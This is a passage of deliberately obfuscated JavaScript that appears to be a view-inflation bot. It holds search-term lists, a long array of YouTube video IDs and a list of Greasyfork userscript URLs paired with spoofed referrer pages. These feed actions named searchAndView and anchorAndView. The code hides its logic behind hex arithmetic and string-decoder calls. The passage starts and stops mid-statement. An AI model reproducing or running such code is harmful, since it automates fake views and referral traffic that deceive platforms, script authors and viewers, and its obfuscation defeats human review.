'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1b5a * 0x1 + -0xdd3 * -0x2 + -0x36f6)), searchTerms['push'](['moomoo.io\x20' + W(0x12)]['repeatExte' + 'nd'](0x9 * 0x1c1 + -0x146a + 0x4ab)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + W(0x7) + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0xc49 * 0x1 + 0x7b8 * 0x3 + -0xadc);

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x2256 + -0x7 * 0x62 + 0x2504);
    let h = e[f];
    return h;
  }, d(b, c);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + U(0xe, '8(DU') + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x15) + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0xb) + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + W(0x13) + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + U(0xc, 'zmwM') + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + V(0x3) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + V(0x9) + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
